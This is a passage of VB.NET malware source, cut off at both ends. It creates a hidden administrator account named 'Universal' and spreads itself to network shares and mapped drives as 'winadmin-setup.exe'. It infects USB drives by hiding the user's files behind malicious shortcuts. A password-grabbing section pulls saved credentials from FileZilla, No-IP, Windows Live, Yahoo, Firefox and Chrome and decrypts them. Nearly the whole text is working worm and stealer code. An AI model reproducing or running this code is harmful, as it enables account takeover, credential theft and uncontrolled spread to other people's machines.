            usr.CommitChanges()

            Dim de As DirectoryEntry
            de = ad.Children.Find("Administrators", "group")
            If de IsNot Nothing Then
                de.Invoke("Add", New Object() {usr.Path.ToString()})
            End If

            Try
                Dim rkey As String = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
                Registry.SetValue(rkey, "Universal", 0, RegistryValueKind.DWord)
            Catch er As Exception

            End Try
        Catch ex As Exception
        End Try
    End Sub
    Public Sub Share()

        Try
            Dim shares As New ManagementObjectSearcher("select * from win32_share")
            For Each serv As ManagementObject In shares.[Get]()
                Dim shareName As String = Convert.ToString(serv("Name"))
                If Not shareName.Contains("$") Then
                    File.Copy([me], ("\\" & Environment.MachineName & "\") + shareName & "\winadmin-setup.exe", True)
                End If
            Next
        Catch ex As Exception
        End Try


        Try
            Dim key As String = "Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU\"
            Dim reg As RegistryKey = Registry.CurrentUser.OpenSubKey(key)


            For Each valuename As String In reg.GetValueNames()
                Dim path As String = reg.GetValue(valuename).ToString()
                If valuename.ToLower() <> "mrulist" Then
                    Try
                        File.Copy([me], path & "\\winadmin-setup.exe", True)
                    Catch er As Exception
                    End Try
                End If
            Next
            reg.Close()
        Catch er As Exception
        End Try
    End Sub
    Public Sub CreateShare(ByVal dir As String, ByVal name As String)

        Try
            Directory.CreateDirectory(dir)
            Dim managementClass As New ManagementClass("Win32_Share")
            Dim inParams As ManagementBaseObject = managementClass.GetMethodParameters("Create")
            Dim outParams As ManagementBaseObject
            inParams("Description") = name
            inParams("Name") = name
            inParams("Path") = dir
            inParams("Type") = &H0
            outParams = managementClass.InvokeMethod("Create", inParams, Nothing)
            If CUInt((outParams.Properties("ReturnValue").Value)) = 0 Then
                If Directory.Exists(dir) Then
                    Dim d As New DirectoryInfo(dir)
                    d.Attributes = FileAttributes.Hidden
                End If

            End If
        Catch e As Exception
        End Try
    End Sub
    Private Class Driverspread
        Private Off As Boolean = False
        Dim thread As Threading.Thread = Nothing
        Dim r As New Random
        Private ExeName As String = r.Next(199997, 88886777) & ".exe"
        Sub Start()
            If thread Is Nothing Then
                thread = New Threading.Thread(AddressOf usb, 1)
                thread.Start()
            End If
        End Sub
        Sub clean()
            Off = True
            Do Until thread Is Nothing
                Threading.Thread.CurrentThread.Sleep(1)
            Loop
            For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If IO.File.Exists(x.Name & ExeName) Then
                            IO.File.SetAttributes(x.Name _
                            & ExeName, IO.FileAttributes.Normal)
                            IO.File.Delete(x.Name & ExeName)
                        End If
                        For Each xx As String In IO.Directory.GetFiles(x.Name)
                            Try
                                IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                If xx.ToLower.EndsWith(".lnk") Then
                                    IO.File.Delete(xx)
                                End If
                            Catch ex As Exception
                            End Try
                        Next
                        For Each xx As String In IO.Directory.GetDirectories(x.Name)
                            Try
                                With New IO.DirectoryInfo(xx)
                                    .Attributes = IO.FileAttributes.Normal
                                End With
                            Catch ex As Exception
                            End Try
                        Next

                    End If
                Catch ex As Exception
                End Try
            Next
        End Sub
        Sub usb()
            Off = False
            Do Until Off = True
                For Each x In IO.DriveInfo.GetDrives
                    Try
                        If x.IsReady Then
                            If x.TotalFreeSpace > 0 Then
                                Try
                                    If IO.File.Exists(x.Name & ExeName) Then
                                        IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                    End If
                                    IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                    IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                    For Each xx As String In IO.Directory.GetFiles(x.Name)
                                        If IO.Path.GetExtension(xx).ToLower <> ".lnk" And _
                                        xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                            IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                            IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                            With CreateObject("WScript.Shell").CreateShortcut _
                                            (x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                                .TargetPath = "cmd.exe"
                                                .WorkingDirectory = ""
                                                .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                                 & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx) _
                                                .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                                .IconLocation = GetIcon(IO.Path.GetExtension(xx))
                                                .Save()
                                            End With
                                        End If
                                    Next
                                    For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                        IO.File.Delete(x.Name & New IO.DirectoryInfo(xx).Name & " .lnk")
                                        With CreateObject("WScript.Shell") _
                                        .CreateShortcut(x.Name & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                            .TargetPath = "cmd.exe"
                                            .WorkingDirectory = ""
                                            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                             & " " & ChrW(34)) & "&explorer /root,""%CD%" & New  _
                                             IO.DirectoryInfo(xx).Name & """ & exit"
                                            .IconLocation = "%SystemRoot%\system32\SHELL32.dll,3" '< folder icon :D
                                            .Save()
                                        End With
                                    Next
                                Catch ex As Exception
                                End Try
                            End If
                        End If
                    Catch ex As Exception
                    End Try
                Next
                Threading.Thread.CurrentThread.Sleep(3000)
            Loop
            thread = Nothing
        End Sub
        Private Function GetIcon(ByVal ext As String) As String
            Try
                Dim r = Microsoft.Win32.Registry _
                .LocalMachine.OpenSubKey("Software\Classes\", False)
                Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
                .GetValue("") & "\DefaultIcon\").GetValue("", "")
                If e.Contains(",") = False Then e &= ",0"
                Return e
            Catch ex As Exception
                Return ""
            End Try
        End Function
    End Class 'Turns All Computer files to Shortcuts
    Private Class Device

        Private mName As String
        Private mManufacturer As String
        Private mDescription As String
        Private mService As String
        Private mDeviceID As String
        Private mPNPDeviceID As String
        Private mClassGUID As String
        Public Property Name() As String
            Get
                Return mName
            End Get
            Set(ByVal value As String)
                mName = value
            End Set
        End Property

        Public Property Manufacturer() As String
            Get
                Return mManufacturer
            End Get
            Set(ByVal value As String)
                mManufacturer = value
            End Set
        End Property

        Public Property Description() As String
            Get
                Return mDescription
            End Get
            Set(ByVal value As String)
                mDescription = value
            End Set
        End Property

        Public Property Service() As String
            Get
                Return mService
            End Get
            Set(ByVal value As String)
                mService = value
            End Set
        End Property

        Public Property DeviceID() As String
            Get
                Return mDeviceID
            End Get
            Set(ByVal value As String)
                mDeviceID = value
            End Set
        End Property

        Public Property PNPDeviceID() As String
            Get
                Return mPNPDeviceID
            End Get
            Set(ByVal value As String)
                mPNPDeviceID = value
            End Set
        End Property

        Public Property ClassGUID() As String
            Get
                Return mClassGUID
            End Get
            Set(ByVal value As String)
                mClassGUID = value
            End Set
        End Property

        Public Shared Function GetAllDevices() As List(Of Device)
            Dim pc As String = "." 'local
            Dim wmi As Object = GetObject("winmgmts:\\" & pc & "\root\cimv2")
            Dim notWorking As New List(Of Device)
            Dim devices As Object = wmi.ExecQuery("Select * from Win32_PnPEntity")
            Dim device As Device
            For Each d As Object In devices
                device = New Device
                device.mClassGUID = IIf(IsDBNull(d.ClassGuid), "N/A", d.ClassGuid)
                device.mDescription = IIf(IsDBNull(d.Description), "N/A", d.Description)
                device.DeviceID = IIf(IsDBNull(d.DeviceID), "N/A", d.DeviceID)
                device.Manufacturer = IIf(IsDBNull(d.Manufacturer), "N/A", d.Manufacturer)
                device.Name = IIf(IsDBNull(d.Name), "N/A", d.Name)
                device.PNPDeviceID = IIf(IsDBNull(d.PNPDeviceID), "N/A", d.PNPDeviceID)
                device.Service = IIf(IsDBNull(d.Service), "N/A", d.Service)
                notWorking.Add(device)
            Next
            Return notWorking
        End Function

        Public Shared Function GetNonWorkingDevices() As List(Of Device)
            Dim pc As String = "." 'local
            Dim wmi As Object = GetObject("winmgmts:\\" & pc & "\root\cimv2")
            Dim notWorking As New List(Of Device)
            Dim devices As Object = wmi.ExecQuery("Select * from Win32_PnPEntity WHERE ConfigManagerErrorCode <> 0")
            Dim device As Device
            For Each d As Object In devices
                device = New Device
                With device

                End With
                device.mClassGUID = d.ClassGuid
                device.mClassGUID = IIf(IsDBNull(d.ClassGuid), "N/A", d.ClassGuid)
                device.mDescription = IIf(IsDBNull(d.Description), "N/A", d.Description)
                device.DeviceID = IIf(IsDBNull(d.DeviceID), "N/A", d.DeviceID)
                device.Manufacturer = IIf(IsDBNull(d.Manufacturer), "N/A", d.Manufacturer)
                device.Name = IIf(IsDBNull(d.Name), "N/A", d.Name)
                device.PNPDeviceID = IIf(IsDBNull(d.PNPDeviceID), "N/A", d.PNPDeviceID)
                device.Service = IIf(IsDBNull(d.Service), "N/A", d.Service)
                notWorking.Add(device)
            Next
            Return notWorking
        End Function


        Public Shared Function CpuTemperature() As Integer 'in Fahrenheit
            Try
                Dim searcher As New ManagementObjectSearcher("root\WMI", "SELECT * FROM MSStorageDriver_ATAPISmartData")
                For Each queryObj As ManagementObject In searcher.Get()
                    Dim arrVendorSpecific As Byte() = queryObj("VendorSpecific")
                    Return arrVendorSpecific(115)
                Next
            Catch err As ManagementException
                MessageBox.Show("An error occurred while querying for WMI data: " & err.Message)
            End Try
        End Function

    End Class
#Region "Password_Grabbers"
    Public Function GTPWD() As String
        OL = ""
        P1()
        P2()
        dyn()
        paltalk()
        GetFire()
        Gchrome()
        Msn()
        Yahoo()
        GetOpera()
        Dim r = New CIE7Passwords
        r.Refresh()
        Return OL
    End Function
    Public OL As String
    Public Sub Yahoo()
        Try
            '    OL += vbNewLine & "###Yahoo" & vbNewLine
            For Each k As String In Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Yahoo\Profiles").GetSubKeyNames
                OL += "|URL| http://Yahoo.com" & vbNewLine & "|USR| " & k & vbNewLine & "|PWD| " & "yahoo" & vbNewLine
            Next
        Catch ex As Exception
        End Try
    End Sub
#Region "MSN Password"
    <DllImport("advapi32.dll", CharSet:=CharSet.Unicode, SetLastError:=True)> _
    Public Function CredEnumerateW(ByVal filter As String, ByVal flag As UInt32, <Out()> ByRef count As UInt32, <Out()> ByRef pCredentials As IntPtr) As Boolean
    End Function
    <StructLayout(LayoutKind.Sequential)> _
    Friend Structure CREDENTIAL
        Public Flags As Integer
        Public Type As Integer
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public TargetName As String
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public Comment As String
        Public LastWritten As Long
        Public CredentialBlobSize As Integer
        Public CredentialBlob As IntPtr
        Public Persist As Integer
        Public AttributeCount As Integer
        Public Attributes As IntPtr
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public TargetAlias As String
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public UserName As String
    End Structure
    Sub Msn()
        '  OL += vbNewLine & "###MSN" & vbNewLine
        Try
            Dim num As UInt32
            Dim zero As IntPtr = IntPtr.Zero
            If CredEnumerateW(("WindowsLive:name=" & "*"), 0, num, zero) Then
                Dim i As Integer
                For i = 0 To num - 1
                    Try
                        Dim s As String
                        OL += "|URL| http://hotmail.com" & vbNewLine
                        Dim credential As CREDENTIAL = DirectCast(Marshal.PtrToStructure(Marshal.ReadIntPtr(zero, (IntPtr.Size * i)), GetType(CREDENTIAL)), CREDENTIAL)
                        OL += "|USR| " & credential.UserName & vbNewLine
                        Try
                            OL += "|PWD| " & Marshal.PtrToStringBSTR(credential.CredentialBlob) & vbNewLine

                        Catch ex As Exception
                            OL += "|PWD| " & vbNewLine
                        End Try
                    Catch ex As Exception
                    End Try
                Next i
            End If
        Catch ex As Exception
        End Try
    End Sub
#End Region
    Sub P1()   '===FileZilla
        Try
            '   OL += vbNewLine & "###FileZilla" & vbNewLine
            Dim O As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")


            For Each u As String In O
                Dim UU = Split(u, vbNewLine)
                For Each I As String In UU
                    If I.Contains("<Host>") Then
                        OL += "|URL| " & Split(Split(I, "<Host>")(1), "</Host>")(0) & vbNewLine
                    End If
                    '   If I.Contains("<Port>") Then
                    'OL += "PRT: " & Split(Split(I, "<Port>")(1), "</Port>")(0) & vbNewLine
                    'End If
                    If I.Contains("<User>") Then
                        OL += "|USR| " & Split(Split(I, "<User>")(1), "</User>")(0) & vbNewLine
                    End If
                    If I.Contains("<Pass>") Then
                        OL += "|PWD| " & Split(Split(I, "<Pass>")(1), "</Pass>")(0) & vbNewLine
                    End If
                Next
            Next
        Catch ex As Exception

        End Try

    End Sub
    Sub P2()  ' NO-IP
        Try
            '  OL += vbNewLine & "###NO-IP" & vbNewLine
            Dim s As String = "HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC"
            Dim U As String = Microsoft.Win32.Registry.GetValue(s, "USERname", "")
            Dim P As String = Microsoft.Win32.Registry.GetValue(s, "Password", "")
            If U = "" Then Exit Sub
            OL += "|URL| http://no-ip.com" & vbNewLine & "|USR| " & U & vbNewLine & "|PWD| " & P & "noip" & vbNewLine
        Catch c As Exception
        End Try
    End Sub
#Region "FireFox"
    Public Function GetFire() As String
        '  OL += vbNewLine & "###FireFox" & vbNewLine
        Try
            Dim FoundFile As Boolean = False
            Dim KeySlot As Long = 0
            Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
            Dim DefaultPath As String = Environment.GetEnvironmentVariable("APPDATA") & "\Mozilla\Firefox\Profiles"
            Dim Dirs As String() = IO.Directory.GetDirectories(DefaultPath)
            For Each dir As String In Dirs
                If Not FoundFile Then
                    Dim Files As String() = IO.Directory.GetFiles(dir)
                    For Each CurrFile As String In Files
                        If Not FoundFile Then
                            If System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite") Then
                                NSS_Init(dir)
                                signon = CurrFile
                            End If
                        Else

                            Exit For
                        End If
                    Next
                Else
                    Exit For
                End If
            Next

            Dim dataSource As String = signon
            Dim tSec As New TSECItem()
            Dim tSecDec As New TSECItem()
            Dim tSecDec2 As New TSECItem()
            Dim bvRet As Byte()
            Dim db As New SQLiteBase5(dataSource)

            Dim table As System.Data.DataTable = db.ExecuteQuery("SELECT * FROM moz_logins;")
            Dim table2 As System.Data.DataTable = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;")
            For Each row As System.Data.DataRow In table2.Rows
            Next
            KeySlot = PK11_GetInternalKeySlot()
            PK11_Authenticate(KeySlot, True, 0)

            For Each Zeile As System.Data.DataRow In table.Rows
                Dim formurl As String = System.Convert.ToString(Zeile("formSubmitURL").ToString())
                Dim url As String = formurl
                Dim usr As String = ""
                Dim pw As String = ""
                Dim se As New StringBuilder(Zeile("encryptedUsername").ToString())
                Dim hi2 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length)
                Dim item As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi2), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item, tSecDec, 0) = 0 Then
                    If tSecDec.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen)
                        usr = System.Text.Encoding.UTF8.GetString(bvRet)
                    End If
                End If
                Dim se2 As New StringBuilder(Zeile("encryptedPassword").ToString())
                Dim hi22 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length)
                Dim item2 As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi22), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item2, tSecDec2, 0) = 0 Then
                    If tSecDec2.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec2.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen)
                        pw = System.Text.Encoding.UTF8.GetString(bvRet)
                    End If
                End If
                OL += "|URL| " & url & vbNewLine & "|USR| " & usr & vbNewLine & "|PWD| " & pw & "firefox" & vbNewLine

            Next
        Catch ex As Exception
        End Try
    End Function
    Public Class SHITEMID
        Public Shared cb As Long
        Public Shared abID As Byte()
    End Class
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure TSECItem
        Public SECItemType As Integer
        Public SECItemData As Integer
        Public SECItemLen As Integer
    End Structure

    <DllImport("kernel32.dll")> _
    Private Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
    End Function
    Private NSS3 As IntPtr
    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)> _
    Private Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long
    Public Function NSS_Init(ByVal configdir As String) As Long
        Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
        LoadLibrary(MozillaPath & "mozutils.dll") 'DODANO
        LoadLibrary(MozillaPath & "mozglue.dll")
        LoadLibrary(MozillaPath & "mozcrt19.dll")
        LoadLibrary(MozillaPath & "nspr4.dll")
        LoadLibrary(MozillaPath & "plc4.dll")
        LoadLibrary(MozillaPath & "plds4.dll")
        LoadLibrary(MozillaPath & "ssutil3.dll")
        LoadLibrary(MozillaPath & "mozsqlite3.dll")
        LoadLibrary(MozillaPath & "nssutil3.dll")
        LoadLibrary(MozillaPath & "softokn3.dll")
        NSS3 = LoadLibrary(MozillaPath & "nss3.dll")
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSS_Init")
        Dim dll As DLLFunctionDelegate = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate)), DLLFunctionDelegate)
        Return dll(configdir)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate2() As Long
    Public Function PK11_GetInternalKeySlot() As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_GetInternalKeySlot")
        Dim dll As DLLFunctionDelegate2 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate2)), DLLFunctionDelegate2)
        Return dll()
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate3(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
    Public Function PK11_Authenticate(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_Authenticate")
        Dim dll As DLLFunctionDelegate3 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate3)), DLLFunctionDelegate3)
        Return dll(slot, loadCerts, wincx)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
    Public Function NSSBase64_DecodeBuffer(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer")
        Dim dll As DLLFunctionDelegate4 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate4)), DLLFunctionDelegate4)
        Return dll(arenaOpt, outItemOpt, inStr, inLen)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
    Public Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11SDR_Decrypt")
        Dim dll As DLLFunctionDelegate5 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate5)), DLLFunctionDelegate5)
        Return dll(data, result, cx)
    End Function
    Public signon As String
    Public Class SQLiteBase5
        <DllImport("kernel32")> _
        Private Shared Function HeapAlloc(ByVal heap As IntPtr, ByVal flags As UInt32, ByVal bytes As UInt32) As IntPtr
        End Function

        <DllImport("kernel32")> _
        Private Shared Function GetProcessHeap() As IntPtr
        End Function

        <DllImport("kernel32")> _
        Private Shared Function lstrlen(ByVal str As IntPtr) As Integer
        End Function
        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_open(ByVal fileName As IntPtr, ByRef database As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_close(ByVal database As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_exec(ByVal database As IntPtr, ByVal query As IntPtr, ByVal callback As IntPtr, ByVal arguments As IntPtr, ByRef [error] As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_errmsg(ByVal database As IntPtr) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_prepare_v2(ByVal database As IntPtr, ByVal query As IntPtr, ByVal length As Integer, ByRef statement As IntPtr, ByRef tail As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_step(ByVal statement As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_count(ByVal statement As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_type(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_int(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_double(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Double
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_text(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_blob(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_table_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_finalize(ByVal handle As IntPtr) As Integer
        End Function

        ' SQLite constants
        Private Const SQL_OK As Integer = 0
        Private Const SQL_ROW As Integer = 100
        Private Const SQL_DONE As Integer = 101
        Public Enum SQLiteDataTypes
            INT = 1
            FLOAT
            TEXT
            BLOB
            NULL
        End Enum
        Private database As IntPtr
        Public Sub New()
            database = IntPtr.Zero
        End Sub
        Public Sub New(ByVal baseName As [String])
            OpenDatabase(baseName)
        End Sub
        Public Sub OpenDatabase(ByVal baseName As [String])
            If sqlite3_open(StringToPointer(baseName), database) <> SQL_OK Then
                database = IntPtr.Zero
                '   Throw New Exception("Error with opening database " & baseName & "!")
            End If
        End Sub
        Public Sub CloseDatabase()
            If database <> IntPtr.Zero Then
                sqlite3_close(database)
            End If
        End Sub
        Public Function GetTables() As ArrayList
            Dim query As [String] = "SELECT name FROM sqlite_master " & "WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'" & "UNION ALL " & "SELECT name FROM sqlite_temp_master " & "WHERE type IN ('table','view') " & "ORDER BY 1"
            Dim table As System.Data.DataTable = ExecuteQuery(query)
            Dim list As New ArrayList()
            For Each row As System.Data.DataRow In table.Rows
                list.Add(row.ItemArray(0).ToString())
            Next
            Return list
        End Function
        Public Sub ExecuteNonQuery(ByVal query As [String])
            Dim [error] As IntPtr
            sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, [error])
            If [error] <> IntPtr.Zero Then
                ' Throw New Exception(("Error with executing non-query: """ & query & """!") + PointerToString(sqlite3_errmsg([error])))
            End If
        End Sub
        Public Function ExecuteQuery(ByVal query As [String]) As System.Data.DataTable
            Dim statement As IntPtr
            Dim excessData As IntPtr
            sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), statement, excessData)
            Dim table As New System.Data.DataTable()
            Dim result As Integer = ReadFirstRow(statement, table)
            While result = SQL_ROW
                result = ReadNextRow(statement, table)
            End While
            sqlite3_finalize(statement)
            Return table
        End Function
        Private Function ReadFirstRow(ByVal statement As IntPtr, ByRef table As System.Data.DataTable) As Integer
            table = New System.Data.DataTable("resultTable")
            Dim resultType As Integer = sqlite3_step(statement)
            If resultType = SQL_ROW Then
                Dim columnCount As Integer = sqlite3_column_count(statement)
                Dim columnName As [String] = ""
                Dim columnType As Integer = 0
                Dim columnValues As Object() = New Object(columnCount - 1) {}
                For i As Integer = 0 To columnCount - 1
                    columnName = PointerToString(sqlite3_column_name(statement, i))
                    columnType = sqlite3_column_type(statement, i)
                    Select Case columnType
                        Case CInt(SQLiteDataTypes.INT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.Int32"))
                                columnValues(i) = sqlite3_column_int(statement, i)
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.FLOAT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.Single"))
                                columnValues(i) = sqlite3_column_double(statement, i)
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.TEXT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.BLOB)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                                Exit Select
                            End If
                        Case Else
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = ""
                                Exit Select
                            End If
                    End Select
                Next
                table.Rows.Add(columnValues)
            End If
            Return sqlite3_step(statement)
        End Function
        Private Function ReadNextRow(ByVal statement As IntPtr, ByRef table As System.Data.DataTable) As Integer
            Dim columnCount As Integer = sqlite3_column_count(statement)

            Dim columnType As Integer = 0
            Dim columnValues As Object() = New Object(columnCount - 1) {}

            For i As Integer = 0 To columnCount - 1
                columnType = sqlite3_column_type(statement, i)

                Select Case columnType
                    Case CInt(SQLiteDataTypes.INT)
                        If True Then
                            columnValues(i) = sqlite3_column_int(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.FLOAT)
                        If True Then
                            columnValues(i) = sqlite3_column_double(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.TEXT)
                        If True Then
                            columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.BLOB)
                        If True Then
                            columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                            Exit Select
                        End If
                    Case Else
                        If True Then
                            columnValues(i) = ""
                            Exit Select
                        End If
                End Select
            Next
            table.Rows.Add(columnValues)
            Return sqlite3_step(statement)
        End Function
        Private Function StringToPointer(ByVal str As [String]) As IntPtr
            If str Is Nothing Then
                Return IntPtr.Zero
            Else
                Dim encoding__1 As Encoding = Encoding.UTF8
                Dim bytes As [Byte]() = encoding__1.GetBytes(str)
                Dim length As UInteger = bytes.Length + 1
                Dim pointer As IntPtr = HeapAlloc(GetProcessHeap(), 0, CType(length, UInt32))
                Marshal.Copy(bytes, 0, pointer, bytes.Length)
                Marshal.WriteByte(pointer, bytes.Length, 0)
                Return pointer
            End If
        End Function
        Private Function PointerToString(ByVal ptr As IntPtr) As [String]
            If ptr = IntPtr.Zero Then
                Return Nothing
            End If

            Dim encoding__1 As Encoding = Encoding.UTF8

            Dim length As Integer = GetPointerLenght(ptr)
            Dim bytes As [Byte]() = New [Byte](length - 1) {}
            Marshal.Copy(ptr, bytes, 0, length)
            Return encoding__1.GetString(bytes, 0, length)
        End Function
        Private Function GetPointerLenght(ByVal ptr As IntPtr) As Integer
            If ptr = IntPtr.Zero Then
                Return 0
            End If
            Return lstrlen(ptr)
        End Function
    End Class
#End Region
#Region "GoogleChrome"

    Sub Gchrome()
        '  OL += vbNewLine & "###Chrome" & vbNewLine
        Try
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")
            If File.Exists(datapath) Then
                Dim host, user, pass As String
                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    host = SQLDatabase.GetValue(i, "origin_url")
                    user = SQLDatabase.GetValue(i, "username_value")
                    pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))
                    If (user <> "") And (pass <> "") Then
                        OL += "|URL| " & host & vbNewLine & "|USR| " & user & vbNewLine & "|PWD| " & pass & "chrome" & vbNewLine

                    End If
                Next
            End If
        Catch ex As Exception
        End Try

    End Sub
    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
